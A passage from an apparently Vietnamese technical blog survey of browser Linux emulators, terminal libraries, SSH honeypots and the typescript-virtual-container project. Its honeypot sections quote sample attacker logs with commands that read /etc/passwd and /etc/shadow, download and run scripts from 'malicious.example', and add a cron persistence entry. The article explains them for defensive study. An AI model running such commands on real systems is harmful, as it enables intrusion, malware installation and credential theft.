Vì nó chạy Node.js thực sự (biên dịch sang Wasm), bạn có npm thực sự, API Node.js thực sự, và phân giải module thực sự. Bạn không có một userspace Linux đa năng -- bạn không thể cài đặt gói hệ thống bằng `apt`, chạy nhị phân biên dịch tùy ý, hoặc làm nhiều việc ngoài hệ sinh thái Node.js.

**Yêu cầu trình duyệt**: SharedArrayBuffer (yêu cầu header COOP/COEP), hỗ trợ Service Worker, Wasm hiện đại.

**Chuyện với Node.js**: được thiết kế độc quyền cho sử dụng trong trình duyệt. API không hoạt động bên ngoài context trình duyệt.

**npm**: [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)  
**Tài liệu**: [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm -- container Docker biên dịch sang Wasm

`container2wasm` là một công cụ (không phải package npm) từ NTT nhận một ảnh container Docker và chuyển đổi nó thành một nhị phân WebAssembly có thể chạy trong bất kỳ host Wasm nào -- kể cả trình duyệt. Khi tôi thấy nó lần đầu tiên, tôi thực sự không tin nó hoạt động.

Cơ chế:
- Cho container x86_64: đóng gói Bochs (một trình giả lập x86, biên dịch sang Wasm) + hệ thống file gốc của container
- Cho container riscv64: đóng gói TinyEMU (lại Bellard!) + hệ thống file gốc của container
- File `.wasm` kết quả khởi động trình giả lập, mount hệ thống file của container, và thực thi điểm vào của container

```bash
# Chuyển đổi một container Ubuntu 22.04 sang Wasm
c2w ubuntu:22.04 out.wasm

# Chạy nó
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# Hoặc phục vụ nó cho sử dụng trong trình duyệt
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

`.wasm` kết quả rất lớn -- một Ubuntu tối thiểu vài trăm MB -- nhưng nó hoàn toàn tự đóng gói. Bạn có thể gửi một `.wasm` qua email cho ai đó và họ có thể chạy Ubuntu trong trình duyệt của họ. Câu đó đáng lẽ không nên có nghĩa nhưng chúng ta đang ở đây.

**GitHub**: [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### Tổng kết họ trình giả lập

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **Kiến trúc** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (độc quyền) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **Nhân thực** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64-bit** | ❌ | ✅ (RISC-V) | ❌ | ✅ | n/a | ✅ |
| **Package npm** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (công cụ CLI) |
| **Sử dụng Node.js** | ✅ | ❌ | ❌ | ❌ | ❌ (chỉ trình duyệt) | qua Wasmtime |
| **Sử dụng trình duyệt** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/instance** | 150-256 MB | ~64-128 MB | ~64 MB | 200+ MB | ~100 MB | ~200-500 MB |
| **Thời gian khởi động** | 15-40s | 10-30s | 10-30s | 15-40s | 2-5s | 10-40s |
| **Mã nguồn mở** | ✅ | ✅ | ✅ | ❌ | một phần | ✅ |
| **Trạng thái** | ✅ rất tích cực | ✅ ổn định | ⚠️ đã lưu trữ | ✅ thương mại | ✅ hoạt động | ✅ hoạt động |

Điều nổi bật trong bảng này: `v86` là cái duy nhất là một package npm, chạy cả trong trình duyệt và Node, và là mã nguồn mở. Đó là lý do nó thống trị cuộc trò chuyện về "trình giả lập Linux bằng JavaScript". Mọi thứ khác đều có một nhược điểm -- JSLinux không có API, jor1k đã được lưu trữ, CheerpX tốn tiền, WebContainers chỉ trình duyệt và dành riêng cho Node, container2wasm yêu cầu bước build và CLI. Nếu bạn chỉ cần "khởi động Linux trong JavaScript", `v86` hầu như luôn là điểm khởi đầu đúng đắn.

---

## Phần 3 -- Stack terminal: xterm.js và node-pty

Hai package liên tục xuất hiện khi mọi người xây dựng trải nghiệm kiểu shell. Chúng không phải sandbox hay trình giả lập -- chúng là hệ thống ống nước UI và PTY -- nhưng chúng có liên quan đến mức tôi sẽ thấy có lỗi nếu bỏ qua chúng. Thêm nữa, tôi đã sử dụng cả hai và chúng thực sự tốt.

### 3.1 `xterm.js` -- render terminal

xterm.js là một trình giả lập terminal cho trình duyệt. Nó hiển thị một màn hình terminal (chuỗi thoát VT100/xterm) trong một phần tử `<canvas>`, xử lý đầu vào bàn phím, và hiển thị một API để định tuyến dữ liệu.

Được sử dụng bởi: terminal tích hợp của VS Code, Azure Cloud Shell, Proxmox VE, AWS CloudShell, và nhiều ứng dụng khác.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// Gửi dữ liệu đến terminal (hiển thị dưới dạng văn bản)
term.write("$ ");
term.onData(data => {
  // data là các lần gõ phím -- gửi đến backend của bạn
  socket.send(data);
});
socket.onmessage(msg => {
  // đầu ra từ backend -- hiển thị nó
  term.write(msg.data);
});
```

xterm.js chỉ là lớp render. Nó không chạy shell. Nó không thông dịch lệnh. Nó là một widget hiển thị mà bạn kết nối với backend bạn chọn. Nhiều người nghĩ xterm.js "làm cái terminal" nhưng nó thực sự chỉ là màn hình -- bạn vẫn cần kết nối nó với thứ gì đó thực sự chạy lệnh.

**npm**: [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)  
**GitHub**: [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty` -- tạo PTY

`node-pty` tạo một pseudoterminal (PTY) trong Node.js và cung cấp cho bạn một handle đọc/ghi lên nó. Được sử dụng với xterm.js, nó cho phép xây dựng một terminal trình duyệt nói chuyện với một shell thực sự (bash, zsh, fish) chạy trên máy chủ.

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // Gửi đến trình duyệt xterm.js qua WebSocket
  ws.send(data);
});

ws.on("message", data => {
  // Chuyển tiếp các lần gõ phím từ trình duyệt đến shell
  shell.write(data);
});
```

Đây là mẫu tiêu chuẩn cho IDE đám mây và terminal web: xterm.js (trình duyệt) ↔ WebSocket ↔ node-pty ↔ bash thực sự. Không có cô lập. Shell chạy với tất cả quyền hạn của tiến trình Node.js (hoặc của người dùng khởi chạy nó).

**Được bảo trì bởi**: Microsoft.  
**npm**: [node-pty](https://www.npmjs.com/package/node-pty)  
**GitHub**: [microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## Phần 4 -- Các honeypot SSH

Honeypot được thiết kế để bị tấn công. Mục đích là trông đủ thực để kẻ tấn công tương tác với chúng, đồng thời ghi lại mọi thứ chúng làm cho tình báo mối đe dọa. SSH là mục tiêu chính vì nó là dịch vụ bị tấn công nhiều nhất trên internet -- nếu bạn mở cổng 22 trên một IP công cộng, bạn sẽ thấy các nỗ lực quét tự động trong vòng vài phút theo đúng nghĩa đen. Thử một ngày nào đó, nó khá kinh khủng khi thấy nó nhanh đến thế nào.

Chất lượng của một honeypot được đo bằng hai thứ: **độ trung thực** (nó bắt chước một hệ thống thực sự thuyết phục đến mức nào) và **đo từ xa** (nó thu thập được bao nhiêu dữ liệu hữu ích). Hai thứ này luôn mâu thuẫn. Một honeypot độ trung thực cao khó xây dựng hơn và rủi ro hơn khi vận hành.

Phần này là thứ cuối cùng đã dẫn tôi đến việc xây dựng module `HoneyPot` trong `typescript-virtual-container`, vì vậy tôi có vài ý kiến ở đây.

### 4.1 Cowrie -- tiêu chuẩn vàng

Cowrie là một honeypot SSH và Telnet tương tác trung bình-đến-cao dựa trên Python. Nó là honeypot SSH được triển khai nhiều nhất trong cộng đồng nghiên cứu và bảo mật.

Kiến trúc:
- **Lớp giao thức**: triển khai thực tế giao thức SSH (Twisted Conch), vì vậy kẻ tấn công có bắt tay thực sự, trao đổi khóa thực sự, xác thực thực sự
- **Lớp shell**: một hệ thống file giả (giống Debian 5.0) và một trình thông dịch shell một phần trả lời các lệnh phổ biến
- **Chế độ proxy**: có thể chuyển hướng đến một hệ thống thực sự phía sau (chế độ tương tác cao), ghi lại mọi thứ đi qua
- **Chế độ LLM** (thêm gần đây): sử dụng mô hình ngôn ngữ để tạo phản hồi động cho các lệnh nó không biết xử lý -- vâng, Cowrie bây giờ có chế độ AI. Chúng ta đang sống trong một thời đại điên rồ.

```python
# Những gì Cowrie thu thập
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

Cowrie lưu trữ các file đã tải xuống (qua wget/curl/SFTP/SCP) để phân tích malware. Nó tích hợp với Splunk, Elasticsearch, và các nền tảng SIEM khác.

**Độ trung thực**: trung bình-cao. Đủ thuyết phục để đánh lừa bot tự động (chiếm 99% kẻ tấn công SSH -- hầu hết chỉ là script ngu ngốc thử `root`/`password`). Con người tinh vi có thể nhận dạng nó qua dấu vân tay, thường là khá nhanh.

**Ngôn ngữ**: Python (Twisted)  
**GitHub**: [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo -- tiền thân của Cowrie

Kippo là honeypot SSH tương tác trung bình gốc mà Cowrie dựa trên. Cùng ý tưởng cơ bản: giao thức SSH thực sự, hệ thống file giả, shell một phần. Cowrie đã hoàn toàn thay thế nó ở thời điểm này -- Kippo đã được lưu trữ và không ai nên sử dụng nó vào năm 2026. Được đề cập ở đây hoàn toàn vì tính đầy đủ lịch sử, vì bạn có thể thấy nó được tham chiếu trong các bài blog cũ và bài báo bảo mật.

**GitHub**: [desaster/kippo](https://github.com/desaster/kippo) -- đã lưu trữ

---

### 4.3 endlessh -- tarpit SSH

endlessh là một honeypot thoái hóa: nó giữ các kết nối SSH mở bằng cách phát dữ liệu banner chậm với tốc độ 1 byte mỗi giây (hoặc ít hơn). Một client SSH kết nối vào nó sẽ bị kẹt vô thời hạn -- nó sẽ không bao giờ đến được xác thực vì máy chủ không bao giờ kết thúc việc gửi banner.

Mục đích không phải là tình báo mối đe dọa mà là từ chối tài nguyên thuần túy: chiếm các luồng quét của kẻ tấn công để chúng không thể tiếp cận các mục tiêu thực sự nhanh như vậy. Thành thật mà nói, nó hơi quỷ quyệt theo một nghĩa tốt. Bạn không học được gì từ kẻ tấn công -- bạn chỉ làm chúng mất thời gian. Có điều gì đó sâu sắc thỏa mãn về điều đó.

```c
// Toàn bộ hành vi giao thức của endlessh:
// Gửi: "SSH-2.0-OpenSSH_" sau đó thêm chậm các ký tự ngẫu nhiên
// Không bao giờ đóng kết nối
// Trình quét của kẻ tấn công sẽ hết thời gian sau N giây
```

Không có lệnh nào được thu thập. Không có xác thực nào được thử. Chỉ là thời gian kết nối.

**Viết bằng**: C  
**GitHub**: [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame -- honeypot "cho tất cả vào"

sshesame chấp nhận mọi kết nối SSH (bất kỳ người dùng nào, bất kỳ mật khẩu nào, bất kỳ khóa nào) và ghi lại mọi thứ. Đó là một honeypot không tương tác: nó không trả lời lệnh, nó chỉ để kẻ tấn công "vào" và ghi lại mọi lần gõ phím chúng gõ.

```
2024-01-15 03:22:11 Kết nối từ 45.33.32.156
  Người dùng: root, Mật khẩu: password123 -- được chấp nhận
  Các lệnh đã gõ:
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  Đã ngắt kết nối sau 47s
```

Hữu ích cho việc thu thập thông tin xác thực: bạn nhanh chóng tích lũy tên người dùng và mật khẩu mà bot thử, cho bạn biết thông tin xác thực mặc định nào hiện đang bị brute-force tích cực. Spoiler: vẫn luôn là `root`/`password`, `admin`/`admin`, và `root`/`123456`. Lần nào cũng vậy.

**GitHub**: [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird -- framework honeypot dựa trên Docker

`lyrebird/honeypot-base` là một ảnh Docker cơ bản để xây dựng honeypot dịch vụ mạng. Nó không phải cụ thể là honeypot SSH -- nó là một framework để xây dựng honeypot cho bất kỳ giao thức nào.

Ảnh cơ bản cung cấp một framework ghi nhật ký, một hệ thống plugin cho các giao thức, và cấu hình Docker Compose cho honeypot đa dịch vụ. Bạn mở rộng nó để mô phỏng các dịch vụ cụ thể.

**Docker Hub**: [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 Xây dựng honeypot SSH trong Node.js -- cách ngây thơ, và tại sao nó thất bại

Trước `typescript-virtual-container`, xây dựng một honeypot SSH trong Node.js có nghĩa là kết hợp thư viện `ssh2` thực sự với mô phỏng lệnh thủ công. Rất tốn công, rất không hoàn chỉnh, nhưng... đó là một nghi thức phải trải qua ở thời điểm này:

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // Ghi lại nỗ lực
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // Cho tất cả vào
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // Phản hồi mô phỏng
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

Nó "hoạt động" theo nghĩa nó thu thập được thông tin xác thực và lệnh. Nhưng nó rõ ràng là giả ngay khi một kẻ tấn công tinh vi đào sâu một chút. `uname -a` trả về chuỗi đúng nhưng `ls /etc` trả về "command not found" -- nó rõ ràng là bẫy. Hệ thống file không tồn tại. Các lệnh không thể nối tiếp. Pipe không hoạt động. Biến không được mở rộng.

Một kẻ tấn công có năng lực sẽ nhận dạng honeypot của bạn trong năm lệnh đầu tiên. Các script tự động tìm kiếm hành vi kiểu Cowrie cũng sẽ phát hiện nó ngay lập tức. Đây dường như là điều đã thúc đẩy tác giả của `typescript-virtual-container` xây dựng thứ gì đó thực sự thông dịch lệnh -- nhiều hơn về điều đó trong Phần 5.

---

### Tổng kết họ honeypot

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | ssh2 ngây thơ |
|---|---|---|---|---|---|---|
| **Mức tương tác** | trung bình-cao | trung bình | không | không | thay đổi | thấp |
| **Giao thức SSH thực** | ✅ | ✅ | ❌ (tarpit) | ✅ | thay đổi | ✅ |
| **Độ trung thực shell** | trung bình | trung bình | n/a | không | thay đổi | tối thiểu |
| **Thu thập thông tin xác thực** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **Thu thập lệnh** | ✅ | ✅ | ❌ | ✅ | thay đổi | ✅ |
| **Thu thập malware** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **Tích hợp SIEM** | ✅ gốc | ❌ | ❌ | ❌ | ❌ | thủ công |
| **Phản hồi LLM** | ✅ (mới) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **Ngôn ngữ** | Python | Python | C | Go | Docker | Node.js |
| **Node.js gốc** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Trạng thái** | ✅ rất tích cực | ⚠️ đã lưu trữ | ✅ hoạt động | ✅ hoạt động | ✅ hoạt động | DIY |

Mô hình ở đây khá rõ ràng: bạn càng muốn độ trung thực cao, bạn càng phải viết nhiều Python. Cowrie là người chiến thắng không thể tranh cãi nếu bạn làm điều này nghiêm túc -- nó đã được kiểm chứng thực địa trong nhiều năm và thu thập được nhiều hơn chỉ thông tin xác thực. endlessh và sshesame là những dự án thú vị hơn là công cụ tình báo mối đe dọa nghiêm túc. Và cách tiếp cận ngây thơ trong Node.js có thể đưa bạn đến khoảng 20% chặng đường trước khi bạn chạm tường.

---

## Phần 5 -- `typescript-virtual-container`: cái lấp đầy khoảng trống

OK vậy đây là lúc mọi thứ trở nên thú vị. Sau khi phân loại tất cả các họ trên, góc phần tư còn thiếu trở nên khá rõ ràng:

- Sandbox JS: cô lập mã, không có shell, không có hệ thống file, không có SSH
- Trình giả lập Linux: OS thực, shell thực, SSH thực... nhưng 150+ MB RAM, 30 giây khởi động, và bạn phải xây dựng API của riêng mình trên E/S serial
- Honeypot: shell giả, không có API lập trình, Python/Go/C, không gốc Node

Chưa ai xây dựng một môi trường Linux hoàn chỉnh, có thể lập trình, gốc Node, với SSH thực sự, quyền thực sự, mạng ảo thực sự, và API TypeScript được kiểu hóa. Vậy nên cô ấy đã xây dựng nó.

Giới thiệu nhỏ vì đây là lần đầu tiên tôi đề cập đúng cách: `typescript-virtual-container` được xây dựng bởi [Chloé Rolzhausen](https://itsrealfortune.fr), một nhà phát triển người Pháp có biệt danh là **Fortune** (hoặc ItsRealFortune) trên mạng. Bạn có thể tìm cô ấy trên [trang web](https://itsrealfortune.fr) và [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/). Toàn bộ dự án -- 56.000 dòng TypeScript, 247 file, 170 lệnh -- là một nỗ lực đơn độc của một người. Tôi sẽ gọi cô ấy là Fortune trong phần còn lại của bài viết. Và vâng, khá điên rồ. Hãy xem công việc của cô ấy!

### Nó thực sự là gì

`typescript-virtual-container` là một **trình mô phỏng môi trường Linux** được viết bằng TypeScript thuần túy. Không Wasm. Không extension gốc. Không nhân. ~56.000 dòng mã nguồn trải trên 247 file TypeScript.

Hiểu biết then chốt: bạn không cần một trình giả lập CPU để làm cho `ls /etc | grep passwd` hoạt động. Bạn cần:
1. Một cây nút trong bộ nhớ trả lời các thao tác đường dẫn
2. Một mô hình quyền POSIX được áp dụng cho mỗi truy cập
3. Một trình phân tích cú pháp shell hiểu pipeline, chuyển hướng, sub-shell và mở rộng biến
4. ~170 triển khai lệnh (các hàm, không phải nhị phân)
5. Một hệ thống quản lý người dùng và nhóm
6. Một thứ gì đó để hiển thị tất cả qua SSH

Tất cả đều khả thi trong TypeScript thuần túy mà không cần bất kỳ sự tham gia nào của nhân.

### VirtualFileSystem

VFS là một cây nút được kiểu hóa trong bộ nhớ -- không có E/S đĩa trừ khi bạn chủ động bật chế độ bền vững `"fs"`:

```ts
// Biểu diễn nội bộ đơn giản hóa
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // placeholder tải lười
```

Mỗi thao tác đường dẫn đi qua `normalizePath` (giải quyết `.`, `..`, liên kết tượng trưng) và `enforceAccess` (kiểm tra quyền đọc/ghi/thực thi dựa trên uid/gid yêu cầu). `chmod`, `chown`, sticky bit và setuid đều được triển khai và thực sự được áp dụng. Nếu một tiến trình chạy với uid 1000 cố gắng đọc một file thuộc về root với chế độ 0600, nó nhận được EACCES -- không phải EACCES giả, mà là một `Error` JavaScript thực sự được ném từ kiểm tra quyền. Phần này khá thanh lịch thành thật mà nói.

VFS tuần tự hóa thành:
- `.vfsb` -- định dạng nhị phân nhỏ gọn (tùy chỉnh, với nén fflate) -- đây là định dạng mặc định
- Ảnh chụp JSON -- có thể đọc được bởi con người, tốt cho debug
- Lưu trữ TAR -- xuất/nhập với định dạng tar thực sự, vì vậy bạn có thể `tar -xf` một cái gì đó và VFS chỉ... có các file đó
- Ảnh SquashFS -- nhập chỉ đọc

Trong chế độ bền vững `"fs"`, nó duy trì một nhật ký ghi trước (WAL) để phục hồi sau sự cố -- ghi vào nhật ký trước, sau đó vào ảnh chụp khi flush. Nếu Node gặp sự cố giữa một thao tác, nhật ký cho phép bạn xây dựng lại trạng thái hoàn chỉnh cuối cùng.

Ngoài ra còn có một lớp `FileCache` mô phỏng độ trễ E/S đĩa. Bạn cấu hình các hồ sơ như `NVME_DISK_IO` hoặc `HDD_DISK_IO` và VFS làm trì hoãn nhân tạo các thao tác file để khớp với thời gian thực tế. Khá buồn cười -- một phần mềm cố tình làm chậm chính nó để mô phỏng phần cứng -- nhưng thực ra rất hữu ích cho benchmarking.

### Trình thông dịch shell

Trình phân tích cú pháp shell tạo ra một AST được kiểu hóa:

```ts
// "ls /etc | grep root && echo done" phân tích thành:
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

Trình thực thi duyệt AST này:
- Cho một pipeline, nó tạo một chuỗi luồng `{ stdin, stdout, stderr }` và thực thi mỗi lệnh với E/S được pipe
- Cho các toán tử logic (`&&`, `||`), nó kiểm tra `$?` sau vế trái trước khi thực thi vế phải
- Cho sub-shell (`$(...)`, `` ` ` ``), nó phân nhánh context thực thi
- Cho chuyển hướng (`>file`, `>>file`, `2>&1`, `<file`), nó thiết lập kết nối luồng trước khi thực thi
- Cho tác vụ nền (`cmd &`), nó thực thi mà không chờ hoàn thành
- Cho biến, nó mở rộng `$VAR`, `${VAR:-default}`, `${#VAR}`, và số học `$((expr))`
- Cho mở rộng dấu ngoặc nhọn (`{a,b,c}`, `{1..5}`), nó tạo ra danh sách mở rộng hoàn chỉnh trước khi thực thi

Tất cả đều là hành vi POSIX shell thực sự. Trình phân tích xử lý heredoc, thay thế tiến trình, glob (`*`, `?`, `[abc]`), và xử lý dấu ngoặc kép (nháy đơn, nháy đôi với nội suy, thoát bằng dấu gạch chéo ngược). Nó không hoàn hảo -- các trường hợp biên tồn tại -- nhưng nó vượt xa những gì bạn mong đợi từ một dự án TypeScript.

### ~170 lệnh tích hợp

Các lệnh là các hàm TypeScript được đăng ký trong một registry lệnh. Chúng nhận một `CommandContext` với các luồng stdin/stdout/stderr, VFS, phiên người dùng, môi trường shell, và quyền truy cập vào các sub-module.

Viết 170 triển khai lệnh Unix là... rất nhiều. Một số đơn giản (`echo`, `true`, `false`), một số phức tạp đáng ngạc nhiên (`awk`, `find`, `tar`). Kiểu, một `awk` POSIX hoàn chỉnh? Trong TypeScript? Thật điên rồ thành thật mà nói. Đây là một mẫu những gì có trong đó:

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (phía client, kết nối đi),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (stub), python3 (stub), node (stub),
nano (trình soạn thảo tương tác hoàn chỉnh), vim (cơ bản), vi (cơ bản),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (mô phỏng), systemctl (stub), journalctl (stub),
...và khoảng 130 lệnh khác
```

"Stub" (git, python3, node) trả lời một cách thực tế cho các lời gọi phổ biến -- `python3 --version` trả về một chuỗi phiên bản đáng tin cậy, `git status` hiển thị trạng thái kho chứa giả -- mà không làm việc thực sự. Đối với honeypot, chúng thực sự hữu ích hơn các lệnh thực sự, vì chúng cho phép bạn quan sát những gì kẻ tấn công cố gắng thực thi mà không thực thi bất cứ thứ gì nguy hiểm.

### Máy chủ SSH

Lớp SSH sử dụng package npm `ssh2` thực sự -- giao thức SSH thực sự, trao đổi khóa thực sự, mã hóa thực sự. `SSHMimic` bọc nó:

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// SSH thực sự: ssh -p 2222 root@localhost
// SFTP thực sự: sftp -P 2222 root@localhost
// SCP thực sự: scp -P 2222 file root@localhost:/tmp/
```

`shellProperties` xác định những gì `uname -a`, `lsb_release -a`, `neofetch`, `/proc/version`, và `/etc/os-release` báo cáo. Bạn có thể bắt chước bất kỳ bản phân phối Linux và phiên bản nhân nào một cách thuyết phục -- đối với một client SSH thực sự, hoàn toàn không có cách nào để phân biệt.

### Module HoneyPot

Bởi vì trình thông dịch shell là thực và máy chủ SSH là thực, lệnh của kẻ tấn công thực sự thực thi trong môi trường ảo. Các yêu cầu `wget` do kẻ tấn công kích hoạt được ghi lại với URL đích. Các file do kẻ tấn công tạo ra được lưu trong VFS. Các nỗ lực leo thang đặc quyền của kẻ tấn công tạo ra lỗi thực tế.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// Sau một phiên, so sánh hệ thống file
const before = shell.vfs.toSnapshot();
// ... phiên của kẻ tấn công ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

Điều này khác về chất so với Cowrie. Hệ thống file giả của Cowrie có thể trả lời `ls` nhưng không thể thực sự theo dõi các file mà kẻ tấn công đã tạo và các sửa đổi chúng đã thực hiện dưới dạng một diff có cấu trúc. `typescript-virtual-container` có thể làm được, vì VFS là một cấu trúc dữ liệu sống -- mỗi ghi đều được theo dõi. Mục cron mà kẻ tấn công vừa thêm? Nó có trong diff. Thư mục `.hidden` đó? Trong diff. Khá hữu ích cho phân tích malware.

### Stack mạng ảo

Đây có lẽ là phần ấn tượng nhất của toàn bộ dự án, và nó không có điểm tương đương trong bất kỳ dự án nào khác trong không gian này. Kiểu, một stack mạng ảo L2/L3 hoàn chỉnh với hỗ trợ VPN, được viết bằng TypeScript thuần túy, không có card mạng thực sự nào tham gia. Thực sự điên rồ.

`VirtualNetworkManager` cấp cho mỗi instance `VirtualShell` các giao diện mạng ảo với địa chỉ IP có thể cấu hình, bảng định tuyến, và tường lửa phần mềm (quy tắc kiểu iptables với conntrack và NAT). `ip addr`, `ip route`, `iptables -L`, `netstat -rn` đều hiển thị trạng thái mạng ảo.

`VirtualSwitch` (tên là Baie -- từ tiếng Pháp có nghĩa là tủ máy chủ, "baie informatique") kết nối nhiều shell trên một mạng con chia sẻ. Nó triển khai:
- Học MAC và ARP
- Định tuyến IP giữa các mạng con
- NAT (masquerade đi)
- DNS (bản ghi có thể cấu hình cho mỗi mạng con)
- Cân bằng tải (round-robin, ít kết nối nhất)
- Định hình lưu lượng: độ trễ, jitter (phân phối Gaussian), mất gói, mất gói theo chùm, sắp xếp lại, trùng lặp
- Giới hạn băng thông (thùng chứa token)
- Áp dụng MTU
- Theo dõi kết nối (có trạng thái, trạng thái NEW/ESTABLISHED/TIME_WAIT)

```ts
const baie = new Baie("192.168.0.0/24");

// Ba máy ảo trên cùng một switch
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// Tường lửa: web có thể đến api, api có thể đến db, web không thể đến db trực tiếp
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// Định hình lưu lượng: mô phỏng liên kết WAN không ổn định ra ngoài
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

`VirtualVpn` tạo các đường hầm mã hóa giữa các instance Baie -- bạn có thể mô phỏng một mạng đa địa điểm với các kết nối liên VPN giữa các địa điểm.

`VirtualProxy` triển khai chuyển tiếp cổng và proxy SOCKS5.

Không có thứ nào trong số này chạm vào card mạng thực sự. Tất cả đều là định tuyến đối tượng TypeScript. Lệnh `ping` "hoạt động" bằng cách định tuyến qua switch ảo và trả về phản hồi ICMP mô phỏng. `curl http://192.168.0.3/api` định tuyến qua mạng ảo, đến phản hồi HTTP mô phỏng của shell api, và trả về nội dung. Đó là rùa suốt từ dưới lên, theo nghĩa tốt nhất có thể.

### SandboxedShell

Đối với sử dụng lập trình nơi bạn cần cô lập mạnh hơn, `SandboxedShell` thực thi một phiên shell trong một thread Worker Node.js:

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 25% của một lõi
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

